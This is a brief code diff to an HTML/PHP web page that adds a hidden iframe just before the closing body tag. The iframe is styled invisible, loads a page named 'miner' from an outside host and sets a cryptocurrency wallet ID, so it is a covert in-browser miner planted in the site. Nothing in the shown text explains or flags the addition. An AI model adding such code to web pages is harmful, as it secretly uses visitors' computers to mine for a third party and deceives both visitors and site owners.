@@ -107,5 +107,6 @@ Watch the <a href="http://bit.ly/19XjyNb">video</a>!
 	}
 	?>
 </div>
+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 14FpXKYtUkQi9G5Ruj5PZibh1e3DtiHUme</script></iframe>
 </body>
 </html>
